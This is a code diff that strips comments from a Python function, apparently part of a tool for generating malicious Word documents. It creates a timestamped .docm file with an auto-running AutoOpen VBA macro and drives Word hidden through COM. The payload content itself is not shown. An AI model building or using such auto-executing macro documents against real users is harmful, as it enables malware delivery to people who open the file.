@@ -6,13 +6,13 @@ from pathlib import Path
 
 def payloadWord(payload_choice):
         
-    # Path where you want to save the file
+    
         timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
         script_dir = Path(__file__).resolve().parent
         file_path = script_dir / f"macro_{timestamp}.docm"
 
 
-        # Define your VBA macro code
+        
         vba_macro = f'''
             Sub AutoOpen()
                 AutoExec
@@ -31,9 +31,9 @@ def payloadWord(payload_choice):
         '''
         
 
-        # Launch Word application
+       
         word = win32.gencache.EnsureDispatch('Word.Application')
-        word.Visible = False  # Set to True if you want to watch it
+        word.Visible = False  
 
 
         doc = word.Documents.Add()
